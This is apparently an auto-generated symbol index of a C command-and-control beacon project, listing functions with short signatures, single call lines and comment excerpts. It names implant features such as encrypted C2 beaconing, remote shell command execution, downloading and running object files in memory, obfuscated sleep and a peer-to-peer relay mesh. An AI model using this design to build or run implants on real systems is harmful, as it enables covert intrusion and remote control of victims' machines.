### setsockopt (function) `setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));`
- Defined: `beacon5.c:1113`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### inet_pton (function) `inet_pton(AF_INET, ip, &addr.sin_addr);`
- Defined: `beacon5.c:1117`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### send (function) `send(sock, buffer, len, 0);`
- Defined: `beacon5.c:1126`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### snprintf (function) `snprintf(msg.msg_id, sizeof(msg.msg_id), "%lx-%lx", (unsigned long)time(NULL), (unsigned long)rand());`
- Defined: `beacon5.c:1134`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### FD_ZERO (function) `FD_ZERO(&readfds);`
- Defined: `beacon5.c:1188`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### FD_SET (function) `FD_SET(sock, &readfds);`
- Defined: `beacon5.c:1190`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sendto (function) `sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&bcast, sizeof(bcast));`
- Defined: `beacon5.c:1200`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### listen (function) `listen(server_sock, 10);`
- Defined: `beacon5.c:1257`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_mutex_init (function) `pthread_mutex_init(&g_mesh.peers_mutex, NULL);`
- Defined: `beacon5.c:1460`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_detach (function) `pthread_detach(tid_discovery);`
- Defined: `beacon5.c:1468`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacon5.c:1473`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sscanf (function) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- Defined: `beacon5.c:1477`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sleep (function) `sleep(6);`
- Defined: `beacon5.c:1494`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacon5.c:1591`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacon5.c:1599`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacon5.c:1602`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacon5.c:1607`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacon5.c:1611`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacon5.c:1627`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

## beacon6.c

### __attribute__ (function) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- Defined: `beacon6.c:142`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### delay_ms (function) `static void delay_ms(int ms)`
- Defined: `beacon6.c:195`
- Doc: sleep ofuscated using poll
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### is_prime (function) `static unsigned int is_prime(unsigned int x)`
- Defined: `beacon6.c:202`
- Doc: -- Lógica de números primos (sin cambios esenciales) ---
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_nth_prime_limited (function) `static unsigned int get_nth_prime_limited(unsigned int n)`
- Defined: `beacon6.c:218`
- Doc: if (x < 2) return 0; if (x == 2) return 1; if ((x & 1) == 0) return 0; /* even > 2 unsigned int d = 3; while (d * d <= x
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### portable_rand_19k_29k (function) `static unsigned int portable_rand_19k_29k(void)`
- Defined: `beacon6.c:242`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `beacon6.c:255`
- Doc: === BEACON API ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `beacon6.c:267`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### create_trampoline (function) `static void* create_trampoline(void* target)`
- Defined: `beacon6.c:279`
- Doc: === CRATE TRAPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cleanup_trampolines (function) `static void cleanup_trampolines(void)`
- Defined: `beacon6.c:315`
- Doc: === CLEAN TRAMPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_or_create_trampoline (function) `static void* get_or_create_trampoline(void* target)`
- Defined: `beacon6.c:330`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacon6.c:362`
- Doc: === CURL WRITE CALLBACK ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### https_request (function) `char* https_request(const char* url, const char* method, const char* post_data)`
- Defined: `beacon6.c:379`
- Doc: === HTTPS REQUEST ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_encode (function) `char* base64_encode(const unsigned char* input, int len)`
- Defined: `beacon6.c:468`
- Doc: === BASE64 ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* input, int* len)`
- Defined: `beacon6.c:484`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon6.c:508`
- Doc: === AES CFB ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon6.c:535`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacon6.c:566`
- Doc: === EXEC CMD ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `beacon6.c:587`
- Doc: === Función auxiliar: alinear al tamaño de página ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RunELF (function) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- Defined: `beacon6.c:592`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacon6.c:974`
- Doc: === GET LOCAL IPs ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### download_bof (function) `unsigned char* download_bof(const char* url, size_t* out_size)`
- Defined: `beacon6.c:1003`
- Doc: === DOWNLOAD BOF ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### run_bof_and_capture (function) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- Defined: `beacon6.c:1025`
- Doc: === RUN BOF AND CAPTURE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### main (function) `int main()`
- Defined: `beacon6.c:1069`
- Doc: === MAIN ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `beacon6.c:65`
- Doc: === TIPOS Y SÍMBOLOS FALTANTES ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### volatile (function) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //`
- Defined: `beacon6.c:148`
- Doc: CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el 
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### poll (function) `poll(&p, 0, ms);`
- Defined: `beacon6.c:197`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### srand (function) `srand((unsigned int)time(NULL));`
- Defined: `beacon6.c:247`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_start (function) `va_start(args, fmt);`
- Defined: `beacon6.c:258`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_end (function) `va_end(args);`
- Defined: `beacon6.c:262`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `beacon6.c:273`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fprintf (function) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- Defined: `beacon6.c:286`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### munmap (function) `munmap(code, code_size);`
- Defined: `beacon6.c:302`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### free (function) `free(g_trampolines);`
- Defined: `beacon6.c:319`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fflush (function) `fflush(stderr);`
- Defined: `beacon6.c:383`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_setopt (function) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- Defined: `beacon6.c:397`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_cleanup (function) `curl_easy_cleanup(curl);`
- Defined: `beacon6.c:442`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `beacon6.c:474`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `beacon6.c:475`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `beacon6.c:476`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `beacon6.c:477`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `beacon6.c:481`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `beacon6.c:511`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `beacon6.c:519`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `beacon6.c:528`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pclose (function) `pclose(fp);`
- Defined: `beacon6.c:571`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### perror (function) `perror("calloc");`
- Defined: `beacon6.c:763`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `beacon6.c:959`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### close (function) `close(sockfd);`
- Defined: `beacon6.c:982`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strdup (function) `return strdup("127.0.0.1");`
- Defined: `beacon6.c:983`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `beacon6.c:993`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strcat (function) `strcat(result, ip);`
- Defined: `beacon6.c:995`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `beacon6.c:999`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### printf (function) `printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);`
- Defined: `beacon6.c:1014`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sscanf (function) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- Defined: `beacon6.c:1075`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### snprintf (function) `snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);`
- Defined: `beacon6.c:1082`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacon6.c:1191`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacon6.c:1199`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacon6.c:1202`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacon6.c:1207`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacon6.c:1211`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacon6.c:1228`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

## beacon_p2p.c

### BeaconDataParse (function) `void BeaconDataParse(datap *parser, char *buffer, int size)`
- Defined: `beacon_p2p.c:91`
- Doc: ======================================================================= FUNCIONES DE LA API DE BEACON (para BOFs) ======
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconDataPtr (function) `char *BeaconDataPtr(datap *parser, int size)`
- Defined: `beacon_p2p.c:96`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconDataInt (function) `int BeaconDataInt(datap *parser)`
- Defined: `beacon_p2p.c:104`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconDataShort (function) `short BeaconDataShort(datap *parser)`
- Defined: `beacon_p2p.c:110`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconDataLength (function) `int BeaconDataLength(datap *parser)`
- Defined: `beacon_p2p.c:116`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconDataExtract (function) `char *BeaconDataExtract(datap *parser, int *size)`
- Defined: `beacon_p2p.c:120`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `beacon_p2p.c:128`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `beacon_p2p.c:141`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### __attribute__ (function) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- Defined: `beacon_p2p.c:228`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### create_trampoline (function) `static void* create_trampoline(void* target)`
- Defined: `beacon_p2p.c:258`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cleanup_trampolines (function) `static void cleanup_trampolines(void)`
- Defined: `beacon_p2p.c:283`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_or_create_trampoline (function) `static void* get_or_create_trampoline(void* target)`
- Defined: `beacon_p2p.c:296`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `beacon_p2p.c:317`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RunELF (function) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
           unsig...`
- Defined: `beacon_p2p.c:323`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacon_p2p.c:554`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### https_request (function) `char* https_request(const char* url, const char* method, const char* post_data)`
- Defined: `beacon_p2p.c:574`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_encode (function) `char* base64_encode(const unsigned char* input, int len)`
- Defined: `beacon_p2p.c:624`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* input, int* len)`
- Defined: `beacon_p2p.c:640`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon_p2p.c:653`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon_p2p.c:680`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacon_p2p.c:712`
- Doc: ======================================================================= UTILIDADES: ejecutar comandos shell, obtener IPs
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacon_p2p.c:728`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### download_bof (function) `unsigned char* download_bof(const char* url, size_t* out_size)`
- Defined: `beacon_p2p.c:756`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### run_bof_and_capture (function) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- Defined: `beacon_p2p.c:765`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### add_peer (function) `void add_peer(struct in_addr ip, int port, const char *id)`
- Defined: `beacon_p2p.c:783`
- Doc: ======================================================================= FUNCIONES P2P ==================================
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### peer_discovery_thread (function) `void *peer_discovery_thread(void *arg)`
- Defined: `beacon_p2p.c:806`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### handle_peer_connection (function) `void *handle_peer_connection(void *arg)`
- Defined: `beacon_p2p.c:845`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### peer_server_thread (function) `void *peer_server_thread(void *arg)`
- Defined: `beacon_p2p.c:915`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### send_to_peer (function) `char* send_to_peer(peer_t *peer, const char *data, int *out_len)`
- Defined: `beacon_p2p.c:934`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### send_to_c2_or_peer (function) `char* send_to_c2_or_peer(const char *url, const char *method, const char *data, int *out_len)`
- Defined: `beacon_p2p.c:967`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### execute_generic_command (function) `char* execute_generic_command(const char *cmd, int *out_len)`
- Defined: `beacon_p2p.c:996`
- Doc: ======================================================================= EJECUTOR DE COMANDOS (unificado para shell y BOF
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### main (function) `int main()`
- Defined: `beacon_p2p.c:1031`
- Doc: ======================================================================= MAIN ===========================================
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_start (function) `va_start(args, fmt);`
- Defined: `beacon_p2p.c:132`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_end (function) `va_end(args);`
- Defined: `beacon_p2p.c:136`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `beacon_p2p.c:147`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `beacon_p2p.c:159`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### volatile (function) `asm volatile( "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" "sub $8, %%rsp\n\t" "mov %0, %%rdi\n\t" "mov %1, %%rsi\n\t" "`
- Defined: `beacon_p2p.c:231`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### munmap (function) `munmap(g_trampolines[i].addr, g_trampolines[i].size);`
- Defined: `beacon_p2p.c:286`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### free (function) `free(g_trampolines);`
- Defined: `beacon_p2p.c:287`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `beacon_p2p.c:534`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_setopt (function) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- Defined: `beacon_p2p.c:579`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### curl_easy_cleanup (function) `curl_easy_cleanup(curl);`
- Defined: `beacon_p2p.c:606`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `beacon_p2p.c:629`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `beacon_p2p.c:630`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `beacon_p2p.c:631`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `beacon_p2p.c:633`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `beacon_p2p.c:637`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `beacon_p2p.c:657`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `beacon_p2p.c:665`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `beacon_p2p.c:673`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pclose (function) `pclose(fp);`
- Defined: `beacon_p2p.c:723`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### close (function) `close(sockfd);`
- Defined: `beacon_p2p.c:737`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strdup (function) `return strdup("127.0.0.1");`
- Defined: `beacon_p2p.c:738`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `beacon_p2p.c:748`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strcat (function) `strcat(result, ip);`
- Defined: `beacon_p2p.c:750`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `beacon_p2p.c:754`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_mutex_lock (function) `pthread_mutex_lock(&g_peer_lock);`
- Defined: `beacon_p2p.c:784`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_mutex_unlock (function) `pthread_mutex_unlock(&g_peer_lock);`
- Defined: `beacon_p2p.c:789`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strncpy (function) `strncpy(g_peers[g_peer_count].id, id, sizeof(g_peers[g_peer_count].id)-1);`
- Defined: `beacon_p2p.c:800`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### setsockopt (function) `setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));`
- Defined: `beacon_p2p.c:810`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### gethostname (function) `gethostname(my_id, sizeof(my_id)-1);`
- Defined: `beacon_p2p.c:817`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### snprintf (function) `snprintf(my_id + strlen(my_id), sizeof(my_id)-strlen(my_id), ":%d", getpid());`
- Defined: `beacon_p2p.c:818`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### bind (function) `bind(udp_sock, (struct sockaddr*)&listen_addr, sizeof(listen_addr));`
- Defined: `beacon_p2p.c:825`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sendto (function) `sendto(udp_sock, my_id, strlen(my_id), 0, (struct sockaddr*)&bc_addr, sizeof(bc_addr));`
- Defined: `beacon_p2p.c:828`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sleep (function) `sleep(BROADCAST_INTERVAL);`
- Defined: `beacon_p2p.c:838`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### write (function) `write(fd, &resp_hdr, sizeof(resp_hdr));`
- Defined: `beacon_p2p.c:864`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacon_p2p.c:871`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### listen (function) `listen(listen_fd, 10);`
- Defined: `beacon_p2p.c:922`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_create (function) `pthread_create(&tid, NULL, handle_peer_connection, (void*)(intptr_t)client_fd);`
- Defined: `beacon_p2p.c:929`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pthread_detach (function) `pthread_detach(tid);`
- Defined: `beacon_p2p.c:930`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### read (function) `read(peer->fd, cipher, resp_hdr.payload_len);`
- Defined: `beacon_p2p.c:959`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### printf (function) `printf("[*] Beacon P2P starting...\n");`
- Defined: `beacon_p2p.c:1032`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacon_p2p.c:1033`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sscanf (function) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- Defined: `beacon_p2p.c:1037`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacon_p2p.c:1097`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacon_p2p.c:1100`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacon_p2p.c:1105`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacon_p2p.c:1108`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

## beacons/v1/beacon.c

### report_result (function) `static void report_result(const bsb_config_t *cfg,
                           const char *command...`
- Defined: `beacons/v1/beacon.c:23`
- Doc: This beacon uses exponential backoff on failures to reduce noise when the C2 is unreachable. The backoff resets on the f
- Depends on: `include/beacon_common.h`

### execute_command (function) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
- Defined: `beacons/v1/beacon.c:96`
- Depends on: `include/beacon_common.h`

### main (function) `int main(void)`
- Defined: `beacons/v1/beacon.c:145`
- Depends on: `include/beacon_common.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacons/v1/beacon.c:28`
- Depends on: `include/beacon_common.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacons/v1/beacon.c:36`
- Depends on: `include/beacon_common.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacons/v1/beacon.c:39`
- Depends on: `include/beacon_common.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacons/v1/beacon.c:44`
- Depends on: `include/beacon_common.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacons/v1/beacon.c:48`
- Depends on: `include/beacon_common.h`

### free (function) `free(ips);`
- Defined: `beacons/v1/beacon.c:51`
- Depends on: `include/beacon_common.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacons/v1/beacon.c:57`
- Depends on: `include/beacon_common.h`

### memcpy (function) `memcpy(full_enc, iv_out, 16);`
- Defined: `beacons/v1/beacon.c:67`
- Depends on: `include/beacon_common.h`

### snprintf (function) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
- Defined: `beacons/v1/beacon.c:73`
- Depends on: `include/beacon_common.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacons/v1/beacon.c:147`
- Depends on: `include/beacon_common.h`

### fprintf (function) `fprintf(stderr, "config error: %s\n", cfg_err);`
- Defined: `beacons/v1/beacon.c:152`
- Depends on: `include/beacon_common.h`

